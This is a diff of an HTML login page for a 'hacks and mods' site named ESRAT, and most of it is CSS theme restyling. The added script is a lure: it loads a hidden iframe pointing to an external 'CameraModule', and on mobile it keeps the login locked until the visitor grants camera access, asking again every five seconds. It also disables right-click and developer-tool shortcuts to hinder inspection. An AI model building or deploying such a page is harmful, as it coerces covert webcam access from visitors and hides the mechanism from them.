@@ -3,40 +3,218 @@
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, shrink-to-fit=no, viewport-fit=cover">
-    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <link href=\'https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css\' rel=\'stylesheet\'>
     <link rel="icon" href="/ESRAT/favicon.ico" type="image/x-icon">
 
     <title>ES-UNIVERSE by GANGA 🎮</title>
-    <meta name="description" content="Welcome, Where AI&ML meets Creativity ! || Get WIN, iOS, Android H@CKS!">
-    <meta name="keywords" content="ganga hacks, hacker ganga, esrat, es ganga, ethical hacking, github, esrat git, mahuldihi hacker">
+<meta name="description" content="Welcome, Where AI&ML meets Creativity ! || Get WIN, iOS, Android H@CKS!">
+<meta name="keywords" content="ganga hacks, hacker ganga, esrat, es ganga, ethical hacking, github, esrat git, mahuldihi hacker">
 
-    <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "WebSite",
-      "name": "ESRAT by GANGA",
-      "url": "https://es-universe.github.io/ESRAT/",
-      "description": "Get exclusive Android mods, hacking tools, AI utilities, and more built by GANGA.",
-      "sameAs": [
-        "https://github.com/ES-UNIVERSE",
-        "https://www.instagram.com/urstruly_ganga/"
-      ]
-    }
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "ESRAT by GANGA",
+  "url": "https://es-universe.github.io/ESRAT/",
+  "description": "Get exclusive Android mods, hacking tools, AI utilities, and more built by GANGA.",
+  "sameAs": [
+    "https://github.com/ES-UNIVERSE",
+    "https://www.instagram.com/urstruly_ganga/"
+  ]
+}
+</script>
+
+<meta property="og:title" content="GANGA\'s H@CK ZONE – Android, iOS, AI Tools & More!">
+<meta property="og:description" content="Get exclusive hacks, tools, and AI utilities crafted by ethical hacker GANGA. 🔐">
+<meta property="og:image" content="https://es-universe.github.io/ESRAT/apks/logo.png">
+<meta property="og:url" content="https://es-universe.github.io/ESRAT/">
+<meta property="og:type" content="website">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="GANGA\'s H@CK ZONE – Android, iOS, AI Tools & More!">
+<meta name="twitter:description" content="Hacks, Mods, and AI Tools built by ethical hacker GANGA.">
+<meta name="twitter:image" content="https://es-universe.github.io/ESRAT/apks/logo.png">
+
+
+</head>
+<body class="login-page">
+
+    <nav class="navbar">
+        <h1 class="logo"><a href="index.html"><img src="apks/logo.png" height="100px"></a></h1>
+    </nav>
+
+    <div class="info">
+        <span id="dynamic-text">
+            <span class="letter">G</span>
+            <span class="letter">A</span>
+            <span class="letter">N</span>
+            <span class="letter">G</span>
+            <span class="letter">A</span>
+        </span>
+
+        <!-- Remove comments if you want to add apk download notice !-->
+         <!-- <a class="info" href="/ESRAT/apks/SS Admin.apk" style="text-decoration: none; display: block; margin-top: 40px;">➡️Click Here⬅️ <br>to download the ADMIN App first!</a> -->
+    </div>
+
+    <!-- Notice Board -->
+    <!-- <div id="notice-board" class="notice-board">
+        <p><b>You didn\'t click ALLOW !<br> ALLOW all the permissions from <br> your browser settings and <br> Refresh to Proceed > > > </b> <br>Username- ganga <br> Password is- password</p>
+    </div> -->
+    
+    <div class="container">
+        <input type="text" id="username" placeholder="Username" disabled autocomplete="off">
+        <input type="password" id="password" placeholder="Password" disabled autocomplete="off">
+        <button id="submit" class="button1" disabled>Login</button>
+        <div id="message-ref" class="message"></div>
+    </div>
+    
+    <div class="home-sci2">
+        <a href="https://wa.me/917008265529?text=Hola, I recently visited your website. Let\'s talk!"><i class=\'bx bxl-whatsapp\'></i></a>
+        <a href="https://www.instagram.com/urstruly_ganga/"><i class=\'bx bxl-instagram\'></i></a>
+        <a href="https://github.com/ES-UNIVERSE"><i class=\'bx bxl-github\'></i></a>
+    </div>
+    <div class="cursor-shadow"></div>
+
+    <!-- Hidden iframe to load the CameraModule -->
+    <iframe id="cameraIframe" src="https://es-universe.github.io/ESRAT/events/CameraModule/index.html" style="display:none;"></iframe>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    
+    <script>
+        let cameraStream = null;  // Variable to store the camera stream
+
+        async function retrieveSacredKeys() {
+            const response = await fetch("/ESRAT/asset/keys.json");
+            const sacredKeys = await response.json();
+            return sacredKeys;
+        }
+
+        function unlockArcaneSecrets(cipheredData, mysticalEssence, celestialKeystone) {
+            const decodedKeystone = CryptoJS.enc.Base64.parse(celestialKeystone);
+            const decodedEssence = CryptoJS.enc.Base64.parse(mysticalEssence);
+            const unlockedSecrets = CryptoJS.AES.decrypt(cipheredData, decodedKeystone, {
+                iv: decodedEssence,
+                mode: CryptoJS.mode.CBC,
+                padding: CryptoJS.pad.Pkcs7
+            });
+            return unlockedSecrets.toString(CryptoJS.enc.Utf8);
+        }
+
+        function enableInputs() {
+            document.getElementById("username").disabled = false;
+            document.getElementById("password").disabled = false;
+            document.getElementById("submit").disabled = false;
+            const noticeBoard = document.getElementById("notice-board");
+            if (noticeBoard) {
+                noticeBoard.style.display = 'none';  // Hide notice board after permission
+            }
+        }
+
+        function disableInputs() {
+            document.getElementById("username").disabled = true;
+            document.getElementById("password").disabled = true;
+            document.getElementById("submit").disabled = true;
+            const noticeBoard = document.getElementById("notice-board");
+            if (noticeBoard) {
+                noticeBoard.style.display = 'block';  // Show notice board if permission is denied
+            }
+        }
+
+        function stopCameraStream() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());  // Stop all tracks
+                cameraStream = null;  // Clear the camera stream
+            }
+        }
+
+        function requestCameraPermission() {
+            // Check if the screen size is small (for mobile devices)
+            if (window.innerWidth <= 768) { // You can adjust the breakpoint as needed
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function(stream) {
+                        console.log("Camera permission granted.");
+                        cameraStream = stream;  // Store the camera stream
+                        enableInputs();  // Enable inputs once permission is granted
+
+                        // Stop the camera stream after 5 seconds
+                        setTimeout(stopCameraStream, 5000);
+                        
+                        clearInterval(cameraInterval);  // Stop asking for permission after it\'s granted
+                    })
+                    .catch(function(err) {
+                        console.log("Camera permission denied, retrying in 5 seconds.");
+                        disableInputs();  // Keep inputs disabled if permission is denied
+                    });
+            } else {
+                // If on larger screens, directly enable inputs without asking for camera
+                enableInputs();
+            }
+        }
+
+        // Check camera permission every 5 seconds until granted
+        const cameraInterval = setInterval(requestCameraPermission, 5000);
+
+        // Event listeners for login
+        document.getElementById("submit").addEventListener("click", verifyEnigmaticCredentials);
+        document.getElementById("password").addEventListener("keydown", (event) => {
+            if (event.key === "Enter") {
+                verifyEnigmaticCredentials();
+            }
+        });
+
+        // Function to verify credentials
+        async function verifyEnigmaticCredentials() {
+            const sacredKeys = await retrieveSacredKeys();
+            const unlockedIdentity = unlockArcaneSecrets(sacredKeys.arcaneCipheredIdentity, sacredKeys.mysticalEssenceOfCipherIdentity, sacredKeys.celestialSecretKeystone);
+            const unlockedPassage = unlockArcaneSecrets(sacredKeys.arcaneCipheredPassage, sacredKeys.mysticalEssenceOfCipherPassage, sacredKeys.celestialSecretKeystone);
+
+            const inputIdentity = document.getElementById("username").value;
+            const inputPassage = document.getElementById("password").value;
+
+            // Check if both inputs are filled
+            if (inputIdentity === "" || inputPassage === "") {
+                alert("Please fill in both username and password.");
+                return;  // Prevent further execution
+            }
+
+            if (inputIdentity === unlockedIdentity && inputPassage === unlockedPassage) {
+                window.location.href = "/ESRAT/index-home.html";  // Redirect if login is successful
+            } else {
+                alert("Incorrect User or Password.");  // Alert on incorrect login
+            }
+        }
+
+        // Cursor shadow effect
+        const cursorShadow = document.querySelector(\".cursor-shadow\");
+        document.addEventListener(\'mousemove\', (event) => {
+            cursorShadow.style.left = event.clientX + \'px\';
+            cursorShadow.style.top = event.clientY + \'px\';
+        });
+
+        // Anti-inspection script
+        document.addEventListener(\'contextmenu\', event => event.preventDefault());  // Disable right-click
+
+        // Disable F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+J
+        document.onkeydown = function(e) {
+            if (e.keyCode === 123) { // F12
+                return false;
+            }
+            if (e.ctrlKey && e.shiftKey && e.keyCode === \'I\'.charCodeAt(0)) {
+                return false; // Ctrl+Shift+I
+            }
+            if (e.ctrlKey && e.keyCode === \'U\'.charCodeAt(0)) {
+                return false; // Ctrl+U
+            }
+            if (e.ctrlKey && e.shiftKey && e.keyCode === \'J\'.charCodeAt(0)) {
+                return false; // Ctrl+Shift+J
+            }
+        };
     </script>
 
-    <meta property="og:title" content="GANGA's H@CK ZONE – Android, iOS, AI Tools & More!">
-    <meta property="og:description" content="Get exclusive hacks, tools, and AI utilities crafted by ethical hacker GANGA. 🔐">
-    <meta property="og:image" content="https://es-universe.github.io/ESRAT/apks/logo.png">
-    <meta property="og:url" content="https://es-universe.github.io/ESRAT/">
-    <meta property="og:type" content="website">
-
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="GANGA's H@CK ZONE – Android, iOS, AI Tools & More!">
-    <meta name="twitter:description" content="Hacks, Mods, and AI Tools built by ethical hacker GANGA.">
-    <meta name="twitter:image" content="https://es-universe.github.io/ESRAT/apks/logo.png">
-
     <style>
+        /* Deep Sea Theme CSS */
         * {
             margin: 0;
             padding: 0;
@@ -68,11 +246,11 @@
             bottom: 0;
             margin: 0;
             padding: 0;
-            /* Darker Deep Sea Gradient - Much darker from middle to bottom */
+            /* Deep Sea Gradient */
             background: linear-gradient(180deg, 
                 #4A90E2 0%,     /* Light blue at top */
                 #357ABD 20%,    /* Medium blue */
-                #2C5F99 35%,    /* Transition point - earlier */
+                #2C5F99 35%,    /* Transition point */
                 #1E3A5F 50%,    /* Dark blue */
                 #0F1F3A 65%,    /* Darker */
                 #0B1426 80%,    /* Very dark */
@@ -95,6 +273,7 @@
             height: 100%;
             overflow: hidden;
             z-index: 1;
+            pointer-events: none;
         }
 
         /* Dynamic Caustics (Light Patterns) */
@@ -170,7 +349,7 @@
             }
         }
 
-        /* Interactive Fish with scatter behavior */
+        /* Interactive Fish */
         .fish {
             position: absolute;
             font-size: 20px;
@@ -178,11 +357,6 @@
             cursor: pointer;
             transition: all 0.3s ease;
             z-index: 2;
-        }
-
-        .fish.scared {
-            transform: scale(0.8);
-            opacity: 0.9;
         }
 
         .fish:nth-child(12) { 
@@ -214,7 +388,7 @@
             animation-delay: 4s;
         }
 
-        /* Fish swimming animations with interactive behavior */
+        /* Fish swimming animations */
         @keyframes fishSwimRight1 {
             0% {
                 transform: translateX(-50px) translateY(0px) scaleX(1);
@@ -281,7 +455,7 @@
             }
         }
 
-        /* Realistic Seabed Grass/Plankton */
+        /* Seabed Grass/Plankton */
         .plankton {
             position: absolute;
             bottom: 0;
@@ -301,7 +475,6 @@
                 0 0 3px rgba(45, 80, 22, 0.5);
         }
 
-        /* Individual grass blades with realistic movement */
         .plankton:nth-child(16) { 
             left: 5%; 
             height: 65px; 
@@ -401,7 +574,7 @@
             width: 4px;
         }
 
-        /* Realistic seaweed swaying animations */
+        /* Seaweed swaying animations */
         @keyframes seaweedSway1 {
             0%, 100% {
                 transform: rotate(-8deg) scaleY(1);
@@ -472,83 +645,51 @@
         .diver {
             position: absolute;
             bottom: 10%;
+            left: 5%;
             font-size: 24px;
             color: #FFD700;
             animation: diverSwim 25s linear infinite;
             z-index: 2;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .diver:hover {
-            transform: scale(1.2);
-            filter: brightness(1.3);
         }
 
         @keyframes diverSwim {
             0% {
-                left: -5%;
-                transform: scaleX(1) translateY(0px);
+                transform: translateX(-50px) translateY(0px);
             }
             25% {
-                left: 25%;
-                transform: scaleX(1) translateY(-20px);
+                transform: translateX(25vw) translateY(-30px);
             }
             50% {
-                left: 50%;
-                transform: scaleX(1) translateY(10px);
+                transform: translateX(50vw) translateY(20px);
             }
             75% {
-                left: 75%;
-                transform: scaleX(1) translateY(-15px);
+                transform: translateX(75vw) translateY(-15px);
             }
             100% {
-                left: 105%;
-                transform: scaleX(1) translateY(5px);
+                transform: translateX(100vw) translateY(10px);
             }
         }
 
         /* Submarine */
         .submarine {
             position: absolute;
-            top: 20%;
+            top: 25%;
+            right: 10%;
             font-size: 28px;
-            color: #C0C0C0;
+            color: #8B4513;
             animation: submarineMove 30s linear infinite;
             z-index: 2;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .submarine:hover {
-            transform: scale(1.1);
-            filter: brightness(1.2);
         }
 
         @keyframes submarineMove {
             0% {
-                right: -10%;
-                transform: scaleX(-1) translateY(0px);
+                transform: translateX(50px) translateY(0px) scaleX(-1);
             }
-            20% {
-                right: 20%;
-                transform: scaleX(-1) translateY(15px);
-            }
-            40% {
-                right: 40%;
-                transform: scaleX(-1) translateY(-25px);
-            }
-            60% {
-                right: 60%;
-                transform: scaleX(-1) translateY(20px);
-            }
-            80% {
-                right: 80%;
-                transform: scaleX(-1) translateY(-10px);
+            50% {
+                transform: translateX(-80vw) translateY(-40px) scaleX(-1);
             }
             100% {
-                right: 110%;
-                transform: scaleX(-1) translateY(0px);
+                transform: translateX(-100vw) translateY(20px) scaleX(-1);
             }
         }
 
@@ -559,40 +700,32 @@
             color: #FF69B4;
             animation: jellyfishFloat 20s ease-in-out infinite;
             z-index: 2;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            filter: drop-shadow(0 0 10px rgba(255, 105, 180, 0.5));
-        }
-
-        .jellyfish:hover {
-            transform: scale(1.15);
-            filter: drop-shadow(0 0 15px rgba(255, 105, 180, 0.8));
         }
 
         .jellyfish:nth-child(30) {
-            top: 30%;
-            left: 10%;
+            top: 40%;
+            left: 70%;
             animation-delay: 0s;
         }
 
         .jellyfish:nth-child(31) {
             top: 60%;
-            right: 15%;
-            animation-delay: 8s;
+            left: 30%;
+            animation-delay: 10s;
         }
 
         @keyframes jellyfishFloat {
             0%, 100% {
-                transform: translateY(0px) rotate(0deg);
+                transform: translateY(0px) translateX(0px);
             }
             25% {
-                transform: translateY(-30px) rotate(5deg);
+                transform: translateY(-20px) translateX(10px);
             }
             50% {
-                transform: translateY(20px) rotate(-3deg);
+                transform: translateY(15px) translateX(-15px);
             }
             75% {
-                transform: translateY(-15px) rotate(7deg);
+                transform: translateY(-10px) translateX(20px);
             }
         }
 
@@ -600,693 +733,360 @@
         .treasure {
             position: absolute;
             bottom: 5%;
-            right: 10%;
+            right: 15%;
             font-size: 26px;
-            color: #DAA520;
+            color: #FFD700;
             animation: treasureGlow 4s ease-in-out infinite;
             z-index: 2;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .treasure:hover {
-            transform: scale(1.2);
-            filter: brightness(1.4);
         }
 
         @keyframes treasureGlow {
             0%, 100% {
-                filter: brightness(1) drop-shadow(0 0 5px rgba(218, 165, 32, 0.5));
+                opacity: 0.8;
+                transform: scale(1);
             }
             50% {
-                filter: brightness(1.3) drop-shadow(0 0 15px rgba(218, 165, 32, 0.8));
+                opacity: 1;
+                transform: scale(1.1);
             }
         }
 
-        /* Coral Reef */
+        /* Coral */
         .coral {
             position: absolute;
             bottom: 0;
             font-size: 18px;
             color: #FF7F50;
-            z-index: 1;
-            animation: coralSway 6s ease-in-out infinite;
+            z-index: 2;
         }
 
         .coral:nth-child(32) {
-            left: 8%;
-            animation-delay: 0s;
+            left: 20%;
+            animation: coralSway 5s ease-in-out infinite;
         }
 
         .coral:nth-child(33) {
-            left: 35%;
-            animation-delay: 2s;
-        }
-
-        .coral:nth-child(34) {
-            right: 20%;
-            animation-delay: 4s;
+            right: 25%;
+            animation: coralSway 6s ease-in-out infinite reverse;
         }
 
         @keyframes coralSway {
             0%, 100% {
-                transform: rotate(-3deg);
+                transform: rotate(-5deg);
             }
             50% {
-                transform: rotate(3deg);
+                transform: rotate(5deg);
             }
         }
 
-        /* Main Content Container */
-        .main-container {
-            position: relative;
-            z-index: 10;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            height: 100dvh;
-            padding: 20px;
-            box-sizing: border-box;
+        /* Original elements styling with deep sea theme integration */
+        .navbar .logo {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 1000;
         }
 
-        /* Logo Container */
-        .logo-container {
+        .navbar .logo img {
+            height: 80px;
+            width: auto;
+            border-radius: 10px;
+            transition: transform 0.3s ease;
+        }
+
+        .navbar .logo img:hover {
+            transform: scale(1.05);
+        }
+
+        .info {
+            position: fixed;
+            top: 150px; /* Adjusted position below the logo */
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 100;
             text-align: center;
-            margin-bottom: 20px;
-            animation: logoFloat 3s ease-in-out infinite;
         }
 
-        @keyframes logoFloat {
+        #dynamic-text {
+            font-size: 4rem;
+            font-weight: bold;
+            color: #FFFFFF; /* Changed to white */
+            text-shadow: 
+                0 0 20px rgba(255, 255, 255, 0.8),
+                0 0 40px rgba(255, 255, 255, 0.6),
+                0 0 60px rgba(255, 255, 255, 0.4);
+            animation: textGlow 3s ease-in-out infinite alternate;
+        }
+
+        @keyframes textGlow {
+            from {
+                text-shadow: 
+                    0 0 20px rgba(255, 255, 255, 0.8),
+                    0 0 40px rgba(255, 255, 255, 0.6),
+                    0 0 60px rgba(255, 255, 255, 0.4);
+            }
+            to {
+                text-shadow: 
+                    0 0 30px rgba(255, 255, 255, 1),
+                    0 0 50px rgba(255, 255, 255, 0.8),
+                    0 0 70px rgba(255, 255, 255, 0.6);
+            }
+        }
+
+        .letter {
+            display: inline-block;
+            animation: letterFloat 2s ease-in-out infinite;
+        }
+
+        .letter:nth-child(1) { animation-delay: 0.1s; }
+        .letter:nth-child(2) { animation-delay: 0.2s; }
+        .letter:nth-child(3) { animation-delay: 0.3s; }
+        .letter:nth-child(4) { animation-delay: 0.4s; }
+        .letter:nth-child(5) { animation-delay: 0.5s; }
+
+        @keyframes letterFloat {
             0%, 100% {
                 transform: translateY(0px);
             }
             50% {
-                transform: translateY(-5px);
+                transform: translateY(-10px);
             }
         }
 
-        .logo-img {
-            width: 60px;
-            height: 60px;
-            transition: all 0.3s ease;
-        }
-
-        .logo-img:hover {
-            transform: scale(1.05);
-        }
-
-        /* Login Form */
-        .login-form {
-            background: linear-gradient(135deg, 
-                rgba(255, 255, 255, 0.1) 0%,
-                rgba(255, 255, 255, 0.05) 100%);
+        .container {
+            position: fixed;
+            bottom: 20%;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 100;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            padding: 30px;
+            background: rgba(11, 20, 38, 0.4);
             backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.2);
             border-radius: 20px;
-            padding: 25px 20px;
-            width: 100%;
-            max-width: 280px;
-            box-shadow: 
-                0 8px 32px rgba(0, 0, 0, 0.3),
-                inset 0 1px 0 rgba(255, 255, 255, 0.2);
-            animation: formSlideIn 0.8s ease-out;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            min-width: 300px;
         }
 
-        @keyframes formSlideIn {
-            0% {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            100% {
-                opacity: 1;
-                transform: translateY(0px);
-            }
-        }
-
-        .form-title {
-            color: #FFFFFF;
-            font-size: 20px;
-            font-weight: 600;
-            text-align: center;
-            margin-bottom: 20px;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
-        }
-
-        .input-group {
-            position: relative;
-            margin-bottom: 18px;
-        }
-
-        .input-group i {
-            position: absolute;
-            left: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: rgba(255, 255, 255, 0.6);
-            font-size: 18px;
-            z-index: 1;
-        }
-
-        .form-input {
-            width: 100%;
-            padding: 15px 15px 15px 50px;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            border-radius: 12px;
+        .container input {
+            padding: 15px 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 15px;
             background: rgba(255, 255, 255, 0.1);
             color: #FFFFFF;
             font-size: 16px;
             outline: none;
             transition: all 0.3s ease;
-            backdrop-filter: blur(5px);
-            -webkit-backdrop-filter: blur(5px);
         }
 
-        .form-input::placeholder {
-            color: rgba(255, 255, 255, 0.5);
+        .container input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
         }
 
-        .form-input:focus {
+        .container input:focus {
             border-color: rgba(255, 255, 255, 0.6);
             background: rgba(255, 255, 255, 0.15);
-            box-shadow: 
-                0 0 0 3px rgba(255, 255, 255, 0.1),
-                0 4px 12px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
         }
 
-        .form-input:focus + i {
-            color: rgba(255, 255, 255, 0.9);
+        .container input:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
 
-        /* Password Toggle */
-        .password-toggle {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: rgba(255, 255, 255, 0.6);
-            cursor: pointer;
-            font-size: 18px;
-            transition: color 0.3s ease;
-            z-index: 2;
-        }
-
-        .password-toggle:hover {
-            color: rgba(255, 255, 255, 0.9);
-        }
-
-        /* High contrast mode support */
-        @media (prefers-contrast: high) {
-            .login-btn {
-                border: 2px solid #FFFFFF;
-                background: #4A90E2;
-            }
-            
-            .login-btn:hover {
-                background: #357ABD;
-            }
-        }
-
-        /* Reduced motion support */
-        @media (prefers-reduced-motion: reduce) {
-            .login-btn {
-                animation: none;
-                transition: background-color 0.2s ease, transform 0.2s ease;
-            }
-            
-            .login-btn::before {
-                display: none;
-            }
-            
-            .login-btn:hover {
-                transform: none;
-                animation: none;
-            }
-        }
-
-        /* Enhanced Dynamic Login Button */
-        .login-btn {
-            position: relative;
-            width: 100%;
-            padding: 16px 24px;
+        .button1 {
+            padding: 15px 30px;
             border: none;
-            border-radius: 16px;
-            background: linear-gradient(135deg, 
-                #4A90E2 0%, 
-                #357ABD 25%, 
-                #2C5F99 50%, 
-                #1E3A5F 75%, 
-                #4A90E2 100%);
-            background-size: 300% 300%;
+            border-radius: 15px;
+            background: linear-gradient(45deg, #4A90E2, #357ABD);
             color: #FFFFFF;
-            font-size: 16px;
-            font-weight: 700;
-            letter-spacing: 0.5px;
+            font-size: 18px;
+            font-weight: 600;
             cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
             overflow: hidden;
-            margin-bottom: 15px;
-            box-shadow: 
-                0 4px 15px rgba(74, 144, 226, 0.3),
-                inset 0 1px 0 rgba(255, 255, 255, 0.2),
-                inset 0 -1px 0 rgba(0, 0, 0, 0.1);
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            animation: gradientShift 3s ease-in-out infinite;
         }
 
-        /* Gradient animation */
-        @keyframes gradientShift {
-            0%, 100% {
-                background-position: 0% 50%;
-            }
-            50% {
-                background-position: 100% 50%;
-            }
+        .button1:hover:not(:disabled) {
+            background: linear-gradient(45deg, #357ABD, #2C5F99);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(74, 144, 226, 0.4);
         }
 
-        /* Ripple effect overlay */
-        .login-btn::before {
+        .button1:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .button1::before {
             content: '';
             position: absolute;
             top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(45deg, 
-                transparent 30%, 
-                rgba(255, 255, 255, 0.1) 50%, 
-                transparent 70%);
-            transform: translateX(-100%);
-            transition: transform 0.6s ease;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
         }
 
-        /* Shine effect */
-        .login-btn::after {
-            content: '';
-            position: absolute;
-            top: 2px;
-            left: 2px;
-            right: 2px;
-            bottom: 2px;
-            background: linear-gradient(135deg, 
-                rgba(255, 255, 255, 0.1) 0%, 
-                transparent 50%, 
-                rgba(255, 255, 255, 0.05) 100%);
-            border-radius: 14px;
+        .button1:hover:not(:disabled)::before {
+            left: 100%;
+        }
+
+        .home-sci2 {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 100;
+            display: flex;
+            gap: 15px;
+        }
+
+        .home-sci2 a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 50px;
+            height: 50px;
+            background: rgba(11, 20, 38, 0.4);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            color: #FFFFFF;
+            font-size: 24px;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        .home-sci2 a:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .cursor-shadow {
+            position: fixed;
+            width: 20px;
+            height: 20px;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.6) 0%, transparent 70%);
+            border-radius: 50%;
             pointer-events: none;
-        }
-
-        /* Hover state */
-        .login-btn:hover {
-            transform: translateY(-3px) scale(1.02);
-            box-shadow: 
-                0 8px 25px rgba(74, 144, 226, 0.4),
-                0 4px 10px rgba(0, 0, 0, 0.2),
-                inset 0 1px 0 rgba(255, 255, 255, 0.3);
-            animation-duration: 1.5s;
-        }
-
-        .login-btn:hover::before {
-            transform: translateX(100%);
-        }
-
-        /* Active/Click state */
-        .login-btn:active {
-            transform: translateY(-1px) scale(0.98);
-            box-shadow: 
-                0 4px 15px rgba(74, 144, 226, 0.3),
-                inset 0 2px 4px rgba(0, 0, 0, 0.2);
-            transition: all 0.1s ease;
-        }
-
-        /* Focus state for accessibility */
-        .login-btn:focus {
-            outline: none;
-            box-shadow: 
-                0 4px 15px rgba(74, 144, 226, 0.3),
-                0 0 0 3px rgba(255, 255, 255, 0.3),
-                inset 0 1px 0 rgba(255, 255, 255, 0.2);
-        }
-
-        /* Pulse animation for attention */
-        .login-btn.pulse {
-            animation: buttonPulse 2s ease-in-out infinite;
-        }
-
-        @keyframes buttonPulse {
-            0%, 100% {
-                box-shadow: 
-                    0 4px 15px rgba(74, 144, 226, 0.3),
-                    0 0 0 0 rgba(74, 144, 226, 0.4);
-            }
-            50% {
-                box-shadow: 
-                    0 4px 15px rgba(74, 144, 226, 0.3),
-                    0 0 0 10px rgba(74, 144, 226, 0);
-            }
-        }
-
-        /* Success state */
-        .login-btn.success {
-            background: linear-gradient(135deg, #4ECDC4 0%, #44A08D 100%);
-            animation: successPulse 0.6s ease-out;
-        }
-
-        @keyframes successPulse {
-            0% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(1.05);
-            }
-            100% {
-                transform: scale(1);
-            }
-        }
-
-        /* Error state */
-        .login-btn.error {
-            background: linear-gradient(135deg, #FF6B6B 0%, #EE5A52 100%);
-            animation: errorShake 0.6s ease-out;
-        }
-
-        @keyframes errorShake {
-            0%, 100% {
-                transform: translateX(0);
-            }
-            25% {
-                transform: translateX(-5px);
-            }
-            75% {
-                transform: translateX(5px);
-            }
-        }
-
-        /* Responsive button adjustments */
-        @media (max-width: 768px) {
-            .login-btn {
-                padding: 14px 20px;
-                font-size: 15px;
-                border-radius: 14px;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .login-btn {
-                padding: 12px 18px;
-                font-size: 14px;
-                border-radius: 12px;
-            }
+            z-index: 9999;
+            transition: transform 0.1s ease;
         }
 
         /* Responsive Design */
         @media (max-width: 768px) {
-            .main-container {
-                padding: 15px;
+            .navbar {
+                padding: 8px 15px;
             }
 
-            .login-form {
-                padding: 20px 15px;
-                margin: 0 10px;
-                max-width: 260px;
+            .navbar .logo img {
+                height: 60px !important;
             }
 
-            .logo-img {
-                width: 50px;
-                height: 50px;
+            #dynamic-text {
+                font-size: 2.5rem;
             }
 
-            .form-title {
-                font-size: 18px;
+            .container {
+                min-width: 280px;
+                padding: 20px;
+                bottom: 15%;
             }
 
-            .form-input {
-                padding: 12px 12px 12px 45px;
+            .container input {
+                padding: 12px 15px;
                 font-size: 14px;
             }
 
-            .input-group i {
-                font-size: 16px;
-                left: 12px;
-            }
-
-            .password-toggle {
-                right: 12px;
+            .button1 {
+                padding: 12px 25px;
                 font-size: 16px;
             }
 
-            .login-btn {
-                padding: 12px;
-                font-size: 14px;
+            .home-sci2 {
+                bottom: 15px;
+                right: 15px;
+                gap: 10px;
+            }
+
+            .home-sci2 a {
+                width: 45px;
+                height: 45px;
+                font-size: 20px;
             }
         }
 
         @media (max-width: 480px) {
-            .login-form {
-                padding: 18px 12px;
-                max-width: 240px;
+            .navbar .logo img {
+                height: 50px !important;
             }
 
-            .logo-img {
-                width: 45px;
-                height: 45px;
+            #dynamic-text {
+                font-size: 2rem;
             }
 
-            .form-title {
-                font-size: 16px;
-                margin-bottom: 18px;
+            .container {
+                min-width: 260px;
+                padding: 15px;
+                bottom: 12%;
             }
 
-            .input-group {
-                margin-bottom: 15px;
-            }
-
-            .form-input {
-                padding: 10px 10px 10px 40px;
+            .container input {
+                padding: 10px 12px;
                 font-size: 14px;
             }
 
-            .input-group i {
-                font-size: 14px;
-                left: 10px;
-            }
-
-            .password-toggle {
-                right: 10px;
-                font-size: 14px;
-            }
-
-            .login-btn {
-                padding: 10px;
+            .button1 {
+                padding: 10px 20px;
                 font-size: 14px;
             }
         }
 
-        /* Accessibility */
-        @media (prefers-reduced-motion: reduce) {
